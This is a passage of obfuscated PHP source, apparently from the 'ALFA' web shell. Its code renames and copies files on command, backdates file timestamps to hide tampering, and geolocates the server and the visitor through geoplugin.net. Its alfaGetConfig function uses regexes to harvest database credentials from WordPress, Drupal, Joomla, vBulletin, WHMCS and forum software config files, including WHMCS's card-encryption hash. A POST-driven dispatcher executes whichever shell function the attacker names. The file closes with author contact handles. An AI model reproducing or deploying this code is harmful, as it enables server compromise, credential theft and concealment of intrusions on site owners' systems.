				if(@rename($_POST['alfa1'], $_POST['alfa2'])||$cttyjrbbaca66cb949843e056d7268641b9b74cc){
					echo "done";
				}else{
					echo "no";
				}
			}else{
				echo "no";
			}
		}
	}elseif($psxclsvx418c5509e2171d55b0aee5c2ea4442b5 == "copy"){
		if(is_dir($_POST["alfa1"])){
			$ofvepnxk736007832d2167baaae763fd3a3f3cf1 = str_replace('//', '/', $_POST["alfa1"]);
			$ofvepnxk736007832d2167baaae763fd3a3f3cf1 = explode('/', $ofvepnxk736007832d2167baaae763fd3a3f3cf1);
			if(empty($ofvepnxk736007832d2167baaae763fd3a3f3cf1[count($ofvepnxk736007832d2167baaae763fd3a3f3cf1) - 1])){
				$kkkpgnftb068931cc450442b63f5b3d276ea4297 = $ofvepnxk736007832d2167baaae763fd3a3f3cf1[count($ofvepnxk736007832d2167baaae763fd3a3f3cf1) - 2];
			}else{
				$kkkpgnftb068931cc450442b63f5b3d276ea4297 = $ofvepnxk736007832d2167baaae763fd3a3f3cf1[count($ofvepnxk736007832d2167baaae763fd3a3f3cf1) - 1];
			}
		}else{
			$kkkpgnftb068931cc450442b63f5b3d276ea4297 = basename($_POST["alfa1"]);
		}
		$ofvepnxk736007832d2167baaae763fd3a3f3cf1 = dirname($_POST["alfa1"]);
		if($ofvepnxk736007832d2167baaae763fd3a3f3cf1 == "."){
			$ofvepnxk736007832d2167baaae763fd3a3f3cf1 = $_POST["c"]."/";
		}
		if(is_file($_POST["alfa1"])){
			@copy($_POST["alfa1"], $_POST["alfa2"]);
			echo("done");
		}elseif(is_dir($_POST["alfa1"])){
			if(!is_dir($_POST["alfa2"])){
				mkdir($_POST["alfa2"], 0755, true);
			}
			copy_paste($ofvepnxk736007832d2167baaae763fd3a3f3cf1, $kkkpgnftb068931cc450442b63f5b3d276ea4297 , $_POST["alfa2"] . "/");
			echo("done");
		}
	}elseif($psxclsvx418c5509e2171d55b0aee5c2ea4442b5 == "modify"){
		if( !empty($_POST['alfa1']) ) {
			$ouidxbfr07cc694b9b3fc636710fa08b6922c42b = strtotime($_POST['alfa1']);
			if($ouidxbfr07cc694b9b3fc636710fa08b6922c42b){
				$xehyltdw62698b8ff9e416d9a7ac0fb3bd548b96 = false;
				if($qfbxlugo26d40443ff695aa5ca38b91e8a4b7772&&$mzmqxzhpe782b1ecc296da557fbe5edc82e64dd7){
					alfaEx("cd '".addslashes($_POST["c"])."';touch -d '".htmlspecialchars(addslashes($_POST['alfa1']))."' '".addslashes($_POST['alfa2'])."'");
					$xehyltdw62698b8ff9e416d9a7ac0fb3bd548b96 = true;
				}
				if(!@touch($_POST['alfa2'],$ouidxbfr07cc694b9b3fc636710fa08b6922c42b,$ouidxbfr07cc694b9b3fc636710fa08b6922c42b)&&!$xehyltdw62698b8ff9e416d9a7ac0fb3bd548b96){
					echo 'no';
				}else{
					echo 'ok';
				}
			} else{
				 echo 'badtime';
			}
		}
	}

}
function alfaget_flags(){
	$btjhezuc4e5868d676cb634aa75b125a0f741abf = array();
	if(function_exists("curl_version")){
		$qqhrnrcwf6e57c9de709e45feb0d955351f53548 = new AlfaCURL();
		$lfqsgloff852bcfb643fb2f46f84ae14b507d1d7 = (!@$_SERVER["SERVER_ADDR"]?(function_exists("gethostbyname")?@gethostbyname($_SERVER['SERVER_NAME']):'????'):@$_SERVER["SERVER_ADDR"]);
		$xlnoekmy327a6c4304ad5938eaf0efb6cc3e53dc = $qqhrnrcwf6e57c9de709e45feb0d955351f53548->Send("http://www.geoplugin.net/json.gp?ip=" . $lfqsgloff852bcfb643fb2f46f84ae14b507d1d7);
		$tylejkbh9a48ddad2656385fce58af47a0ef56cf = $qqhrnrcwf6e57c9de709e45feb0d955351f53548->Send("http://www.geoplugin.net/json.gp?ip=" . $_SERVER["REMOTE_ADDR"]);
		if(strpos($tylejkbh9a48ddad2656385fce58af47a0ef56cf, "geoplugin") != false){
			$xlnoekmy327a6c4304ad5938eaf0efb6cc3e53dc = json_decode($xlnoekmy327a6c4304ad5938eaf0efb6cc3e53dc, true);
			$tylejkbh9a48ddad2656385fce58af47a0ef56cf = json_decode($tylejkbh9a48ddad2656385fce58af47a0ef56cf, true);
			if(!empty($xlnoekmy327a6c4304ad5938eaf0efb6cc3e53dc['geoplugin_countryCode'])){
				$btjhezuc4e5868d676cb634aa75b125a0f741abf["server"]["name"] = $xlnoekmy327a6c4304ad5938eaf0efb6cc3e53dc['geoplugin_countryName'];
				$btjhezuc4e5868d676cb634aa75b125a0f741abf["server"]["code"] = $xlnoekmy327a6c4304ad5938eaf0efb6cc3e53dc['geoplugin_countryCode'];
			}
			if(!empty($tylejkbh9a48ddad2656385fce58af47a0ef56cf['geoplugin_countryCode'])){
				$btjhezuc4e5868d676cb634aa75b125a0f741abf["client"]["name"] = $tylejkbh9a48ddad2656385fce58af47a0ef56cf['geoplugin_countryName'];
				$btjhezuc4e5868d676cb634aa75b125a0f741abf["client"]["code"] = $tylejkbh9a48ddad2656385fce58af47a0ef56cf['geoplugin_countryCode'];
			}
		}
	}
	echo json_encode($btjhezuc4e5868d676cb634aa75b125a0f741abf);
}
function alfaGetConfig(){
$enqiaukc570d99e4c85914470d914170d1e95144 = $_POST['alfa1'];
$jwzcflrpd6fe1d0be6347b8ef2427fa629c04485 = trim($_POST['alfa2']);
$yzrzmzyl2245023265ae4cf87d02c8b6ba991139 = array(
'wp'=>array('file'=>'/wp-config.php',
'host'=>array("/define[ ]{0,}\([ ]{0,}(?:'|\")DB_HOST(?:'|\")[ ]{0,},[ ]{0,}(?:'|\")(.*?)(?:'|\")[ ]{0,}\)[ ]{0,};/",1),
'dbname'=>array("/define[ ]{0,}\([ ]{0,}(?:'|\")DB_NAME(?:'|\")[ ]{0,},[ ]{0,}(?:'|\")(.*?)(?:'|\")[ ]{0,}\)[ ]{0,};/",1),
'dbuser'=>array("/define[ ]{0,}\([ ]{0,}(?:'|\")DB_USER(?:'|\")[ ]{0,},[ ]{0,}(?:'|\")(.*?)(?:'|\")[ ]{0,}\)[ ]{0,};/",1),
'dbpw'=>array("/define[ ]{0,}\([ ]{0,}(?:'|\")DB_PASSWORD(?:'|\")[ ]{0,},[ ]{0,}(?:'|\")(.*?)(?:'|\")[ ]{0,}\)[ ]{0,};/",1),
'prefix'=>array("/table_prefix[ ]{0,}=[ ]{0,}(?:'|\")(.*?)(?:'|\")[ ]{0,};/",1)
),
'drupal'=>array('file'=>'/config.php',
'host'=>array("/define[ ]{0,}\([ ]{0,}(?:'|\")DB_HOSTNAME(?:'|\")[ ]{0,},[ ]{0,}(?:'|\")(.*?)(?:'|\")[ ]{0,}\)[ ]{0,};/",1),
'dbname'=>array("/define[ ]{0,}\([ ]{0,}(?:'|\")DB_DATABASE(?:'|\")[ ]{0,},[ ]{0,}(?:'|\")(.*?)(?:'|\")[ ]{0,}\)[ ]{0,};/",1),
'dbuser'=>array("/define[ ]{0,}\([ ]{0,}(?:'|\")DB_USERNAME(?:'|\")[ ]{0,},[ ]{0,}(?:'|\")(.*?)(?:'|\")[ ]{0,}\)[ ]{0,};/",1),
'dbpw'=>array("/define[ ]{0,}\([ ]{0,}(?:'|\")DB_PASSWORD(?:'|\")[ ]{0,},[ ]{0,}(?:'|\")(.*?)(?:'|\")[ ]{0,}\)[ ]{0,};/",1),
'prefix'=>array("/define[ ]{0,}\([ ]{0,}(?:'|\")DB_PREFIX(?:'|\")[ ]{0,},[ ]{0,}(?:'|\")(.*?)(?:'|\")[ ]{0,}\)[ ]{0,};/",1)
),
'drupal2'=>array('file'=>'/sites/default/settings.php',
'host'=>array("/(?:'|\")host(?:'|\")[ ]{0,}=>[ ]{0,}(?:'|\")(.*?)(?:'|\")[ ]{0,},/",1),
'dbname'=>array("/(?:'|\")database(?:'|\")[ ]{0,}=>[ ]{0,}(?:'|\")(.*?)(?:'|\")[ ]{0,},/",1),
'dbuser'=>array("/(?:'|\")username(?:'|\")[ ]{0,}=>[ ]{0,}(?:'|\")(.*?)(?:'|\")[ ]{0,},/",1),
'dbpw'=>array("/(?:'|\")password(?:'|\")[ ]{0,}=>[ ]{0,}(?:'|\")(.*?)(?:'|\")[ ]{0,},/",1),
'prefix'=>array("/(?:'|\")prefix(?:'|\")[ ]{0,}=>[ ]{0,}(?:'|\")(.*?)(?:'|\")[ ]{0,},/",1)
),
'vb'=>array('file'=>'/includes/config.php',
'host'=>array("/config\[(?:'|\")MasterServer(?:'|\")\]\[(?:'|\")servername(?:'|\")\](\s+)=(\s+)(?:'|\")(.*?)(?:'|\")[ ]{0,};/",3),
'dbuser'=>array("/config\[(?:'|\")MasterServer(?:'|\")\]\[(?:'|\")username(?:'|\")\](\s+)=(\s+)(?:'|\")(.*?)(?:'|\")[ ]{0,};/",3),
'dbname'=>array("/config\[(?:'|\")Database(?:'|\")\]\[(?:'|\")dbname(?:'|\")\](\s+)=(\s+)(?:'|\")(.*?)(?:'|\")[ ]{0,};/",3),
'dbpw'=>array("/config\[(?:'|\")MasterServer(?:'|\")\]\[(?:'|\")password(?:'|\")\](\s+)=(\s+)(?:'|\")(.*?)(?:'|\")[ ]{0,};/",3),
'prefix'=>array("/config\[(?:'|\")Database(?:'|\")\]\[(?:'|\")tableprefix(?:'|\")\](\s+)=(\s+)(?:'|\")(.*?)(?:'|\")[ ]{0,};/",3)
),
'phpnuke'=>array('file'=>'/config.php',
'host'=>array('/dbhost(\s+)=(\s+)(?:\'|")(.*?)(?:\'|");/',3),
'dbname'=>array('/dbname(\s+)=(\s+)(?:\'|")(.*?)(?:\'|");/',3),
'dbuser'=>array('/dbuname(\s+)=(\s+)(?:\'|")(.*?)(?:\'|");/',3),
'dbpw'=>array('/dbpass(\s+)=(\s+)(?:\'|")(.*?)(?:\'|");/',3),
'prefix'=>array('/prefix(\s+)=(\s+)(?:\'|")(.*?)(?:\'|");/',3)
),
'smf'=>array('file'=>'/Settings.php',
'host'=>array("/db_server(\s+)=(\s+)(?:'|\")(.*?)(?:'|\");/",3),
'dbname'=>array("/db_name(\s+)=(\s+)(?:'|\")(.*?)(?:'|\");/",3),
'dbuser'=>array("/db_user(\s+)=(\s+)(?:'|\")(.*?)(?:'|\");/",3),
'dbpw'=>array("/db_passwd(\s+)=(\s+)(?:'|\")(.*?)(?:'|\");/",3),
'prefix'=>array("/db_prefix(\s+)=(\s+)(?:'|\")(.*?)(?:'|\");/",3)
),
'whmcs'=>array('file'=>'/configuration.php',
'host'=>array("/db_host(\s+)=(\s+)(?:'|\")(.*?)(?:'|\");/",3),
'dbname'=>array("/db_name(\s+)=(\s+)(?:'|\")(.*?)(?:'|\");/",3),
'dbuser'=>array("/db_username(\s+)=(\s+)(?:'|\")(.*?)(?:'|\");/",3),
'dbpw'=>array("/db_password(\s+)=(\s+)(?:'|\")(.*?)(?:'|\");/",3),
'cc_encryption_hash'=>array("/cc_encryption_hash(\s+)=(\s+)(?:'|\")(.*?)(?:'|\");/",3)
),
'joomla'=>array('file'=>'/configuration.php',
'host'=>array("/\\\$host(\s+)=(\s+)(?:'|\")(.*?)(?:'|\");/",3),
'dbname'=>array("/\\\$db(\s+)=(\s+)(?:'|\")(.*?)(?:'|\");/",3),
'dbuser'=>array("/\\\$user(\s+)=(\s+)(?:'|\")(.*?)(?:'|\");/",3),
'dbpw'=>array("/\\\$password(\s+)=(\s+)(?:'|\")(.*?)(?:'|\");/",3),
'prefix'=>array("/\\\$dbprefix(\s+)=(\s+)(?:'|\")(.*?)(?:'|\");/",3)
),
'phpbb'=>array('file'=>'/config.php',
'host'=>array("/dbhost(\s+)=(\s+)(?:'|\")(.*?)(?:'|\");/",3),
'dbname'=>array("/dbname(\s+)=(\s+)(?:'|\")(.*?)(?:'|\");/",3),
'dbuser'=>array("/dbuser(\s+)=(\s+)(?:'|\")(.*?)(?:'|\");/",3),
'dbpw'=>array("/dbpasswd(\s+)=(\s+)(?:'|\")(.*?)(?:'|\");/",3),
'prefix'=>array("/table_prefix(\s+)=(\s+)(?:'|\")(.*?)(?:'|\");/",3)
),
'mybb'=>array('file'=>'/inc/config.php',
'host'=>array("/config\['database'\]\['hostname'\](\s+)=(\s+)(?:'|\")(.*?)(?:'|\");/",3),
'dbname'=>array("/config\['database'\]\['database'\](\s+)=(\s+)(?:'|\")(.*?)(?:'|\");/",3),
'dbuser'=>array("/config\['database'\]\['username'\](\s+)=(\s+)(?:'|\")(.*?)(?:'|\");/",3),
'dbpw'=>array("/config\['database'\]\['password'\](\s+)=(\s+)(?:'|\")(.*?)(?:'|\");/",3),
'prefix'=>array("/config\['database'\]\['table_prefix'\](\s+)=(\s+)(?:'|\")(.*?)(?:'|\");/",3)
)
);
if($enqiaukc570d99e4c85914470d914170d1e95144 == "drupal"){
	$wdyhqgwg8c7dd922ad47494fc02c388e12c00eac = $yzrzmzyl2245023265ae4cf87d02c8b6ba991139[$enqiaukc570d99e4c85914470d914170d1e95144]['file'];
	$wdyhqgwg8c7dd922ad47494fc02c388e12c00eac=$jwzcflrpd6fe1d0be6347b8ef2427fa629c04485.$wdyhqgwg8c7dd922ad47494fc02c388e12c00eac;
	if(@is_file($wdyhqgwg8c7dd922ad47494fc02c388e12c00eac)||_alfa_is_dir($wdyhqgwg8c7dd922ad47494fc02c388e12c00eac,"-e")){
	}else{
		$enqiaukc570d99e4c85914470d914170d1e95144 = 'drupal2';
	}
}
if($enqiaukc570d99e4c85914470d914170d1e95144 == "vb"){
	$wdyhqgwg8c7dd922ad47494fc02c388e12c00eac = $yzrzmzyl2245023265ae4cf87d02c8b6ba991139[$enqiaukc570d99e4c85914470d914170d1e95144]['file'];
	$wdyhqgwg8c7dd922ad47494fc02c388e12c00eac=$jwzcflrpd6fe1d0be6347b8ef2427fa629c04485.$wdyhqgwg8c7dd922ad47494fc02c388e12c00eac;
	if(@is_file($wdyhqgwg8c7dd922ad47494fc02c388e12c00eac)||_alfa_is_dir($wdyhqgwg8c7dd922ad47494fc02c388e12c00eac,"-e")){
	}else{
		$jwzcflrpd6fe1d0be6347b8ef2427fa629c04485 .= '/core';
	}
}
$sfmsaibm8d777f385d3dfec8815d20f7496026dc = array();
$hnsrclypbac4adc173a3745efc2f4939b713c346 = $yzrzmzyl2245023265ae4cf87d02c8b6ba991139[$enqiaukc570d99e4c85914470d914170d1e95144]['host'][0];
$wurzeofr2b31720dca23b9925c82172fcca3bf68 = $yzrzmzyl2245023265ae4cf87d02c8b6ba991139[$enqiaukc570d99e4c85914470d914170d1e95144]['dbuser'][0];
$sgdziobb2f9a8ec9a4fffa394b623ff8505011d4 = $yzrzmzyl2245023265ae4cf87d02c8b6ba991139[$enqiaukc570d99e4c85914470d914170d1e95144]['dbname'][0];
$mghngesfcb7772f374ec9559947e11d9f01e9b5f = $yzrzmzyl2245023265ae4cf87d02c8b6ba991139[$enqiaukc570d99e4c85914470d914170d1e95144]['dbpw'][0];
$unkkdhum851f5ac9941d720844d143ed9cfcf60a = $yzrzmzyl2245023265ae4cf87d02c8b6ba991139[$enqiaukc570d99e4c85914470d914170d1e95144]['prefix'][0];
$wdyhqgwg8c7dd922ad47494fc02c388e12c00eac = $yzrzmzyl2245023265ae4cf87d02c8b6ba991139[$enqiaukc570d99e4c85914470d914170d1e95144]['file'];
$stlzgltg88721ba1e1ed952bb5bcf6664faefcd0 = $yzrzmzyl2245023265ae4cf87d02c8b6ba991139[$enqiaukc570d99e4c85914470d914170d1e95144]['host'][1];
$khakmwfef858b35cb8b1ad3bdf07222ee8c8c6c5 = $yzrzmzyl2245023265ae4cf87d02c8b6ba991139[$enqiaukc570d99e4c85914470d914170d1e95144]['dbuser'][1];
$cwpcfkkr056301054c43f8bbea2090debfec16b1 = $yzrzmzyl2245023265ae4cf87d02c8b6ba991139[$enqiaukc570d99e4c85914470d914170d1e95144]['dbname'][1];
$mcncodcweb1b24702ab3af352eae9a67ef953b9c = $yzrzmzyl2245023265ae4cf87d02c8b6ba991139[$enqiaukc570d99e4c85914470d914170d1e95144]['dbpw'][1];
$trggwmuid05ec7e9b90a30f9d7a4d2626a4f48a5 = $yzrzmzyl2245023265ae4cf87d02c8b6ba991139[$enqiaukc570d99e4c85914470d914170d1e95144]['prefix'][1];
if(@is_dir($jwzcflrpd6fe1d0be6347b8ef2427fa629c04485)||_alfa_is_dir($jwzcflrpd6fe1d0be6347b8ef2427fa629c04485)){
$wdyhqgwg8c7dd922ad47494fc02c388e12c00eac=$jwzcflrpd6fe1d0be6347b8ef2427fa629c04485.$wdyhqgwg8c7dd922ad47494fc02c388e12c00eac;
}elseif(@is_file($jwzcflrpd6fe1d0be6347b8ef2427fa629c04485)||_alfa_is_dir($jwzcflrpd6fe1d0be6347b8ef2427fa629c04485,"-e")){
$wdyhqgwg8c7dd922ad47494fc02c388e12c00eac=$jwzcflrpd6fe1d0be6347b8ef2427fa629c04485;
}else{
return false;
}
$wdyhqgwg8c7dd922ad47494fc02c388e12c00eac = __read_file($wdyhqgwg8c7dd922ad47494fc02c388e12c00eac);
if($enqiaukc570d99e4c85914470d914170d1e95144 == "drupal2"){
	$wdyhqgwg8c7dd922ad47494fc02c388e12c00eac = preg_replace("/\@code(.*?)\@endcode/s", "", $wdyhqgwg8c7dd922ad47494fc02c388e12c00eac);
}elseif($enqiaukc570d99e4c85914470d914170d1e95144 == "vb"){
	$wdyhqgwg8c7dd922ad47494fc02c388e12c00eac = preg_replace("/right of the(.*?)BAD!/s", "", $wdyhqgwg8c7dd922ad47494fc02c388e12c00eac);
}
if(preg_match($hnsrclypbac4adc173a3745efc2f4939b713c346, $wdyhqgwg8c7dd922ad47494fc02c388e12c00eac, $osskmrcp73b5ac0111d26c2c149c563e8c027aab)){
$sfmsaibm8d777f385d3dfec8815d20f7496026dc['host'] = $osskmrcp73b5ac0111d26c2c149c563e8c027aab[$stlzgltg88721ba1e1ed952bb5bcf6664faefcd0];
}
if(preg_match($wurzeofr2b31720dca23b9925c82172fcca3bf68, $wdyhqgwg8c7dd922ad47494fc02c388e12c00eac, $osskmrcp73b5ac0111d26c2c149c563e8c027aab)){
$sfmsaibm8d777f385d3dfec8815d20f7496026dc['user'] = $osskmrcp73b5ac0111d26c2c149c563e8c027aab[$khakmwfef858b35cb8b1ad3bdf07222ee8c8c6c5];
}
if(preg_match($sgdziobb2f9a8ec9a4fffa394b623ff8505011d4, $wdyhqgwg8c7dd922ad47494fc02c388e12c00eac, $osskmrcp73b5ac0111d26c2c149c563e8c027aab)){
$sfmsaibm8d777f385d3dfec8815d20f7496026dc['dbname'] = $osskmrcp73b5ac0111d26c2c149c563e8c027aab[$cwpcfkkr056301054c43f8bbea2090debfec16b1];
}
if(preg_match($mghngesfcb7772f374ec9559947e11d9f01e9b5f, $wdyhqgwg8c7dd922ad47494fc02c388e12c00eac, $osskmrcp73b5ac0111d26c2c149c563e8c027aab)){
$sfmsaibm8d777f385d3dfec8815d20f7496026dc['password'] = $osskmrcp73b5ac0111d26c2c149c563e8c027aab[$mcncodcweb1b24702ab3af352eae9a67ef953b9c];
}
if(isset($unkkdhum851f5ac9941d720844d143ed9cfcf60a)){
if(preg_match($unkkdhum851f5ac9941d720844d143ed9cfcf60a, $wdyhqgwg8c7dd922ad47494fc02c388e12c00eac, $osskmrcp73b5ac0111d26c2c149c563e8c027aab)){
$sfmsaibm8d777f385d3dfec8815d20f7496026dc['prefix'] = $osskmrcp73b5ac0111d26c2c149c563e8c027aab[$trggwmuid05ec7e9b90a30f9d7a4d2626a4f48a5];
}
}
if($enqiaukc570d99e4c85914470d914170d1e95144=='whmcs'){
if(preg_match($yzrzmzyl2245023265ae4cf87d02c8b6ba991139[$enqiaukc570d99e4c85914470d914170d1e95144]['cc_encryption_hash'][0], $wdyhqgwg8c7dd922ad47494fc02c388e12c00eac, $osskmrcp73b5ac0111d26c2c149c563e8c027aab)){
$sfmsaibm8d777f385d3dfec8815d20f7496026dc['cc_encryption_hash'] = $osskmrcp73b5ac0111d26c2c149c563e8c027aab[3];
}
}
echo json_encode($sfmsaibm8d777f385d3dfec8815d20f7496026dc);
}
if(empty($_POST['a']))
if(isset($qsvrxdva707d47ef3e8b55054789cb477a5e0c0f) && function_exists('alfa' . $qsvrxdva707d47ef3e8b55054789cb477a5e0c0f))
$_POST['a'] = $qsvrxdva707d47ef3e8b55054789cb477a5e0c0f;
else
$_POST['a'] = 'FilesMan2';//'FilesMan';
if(!empty($_POST['a']) && function_exists('alfa' . $_POST['a']))
call_user_func('alfa' . $_POST['a']);
exit;
/*
#Persian Gulf For Ever
#skype : sole.sad
#skype : ehsan.invisible
*/
?>
